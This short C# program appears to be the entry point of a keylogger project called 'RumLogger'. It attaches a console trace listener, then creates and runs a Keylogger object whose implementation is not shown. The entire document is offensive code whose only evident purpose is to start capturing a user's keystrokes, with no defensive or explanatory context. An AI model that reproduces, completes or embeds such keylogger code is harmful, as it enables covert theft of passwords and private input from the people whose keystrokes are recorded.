using System.Diagnostics;
using RumLogger;


Trace.Listeners.Add(new ConsoleTraceListener());


var k = new Keylogger();
k.Run();
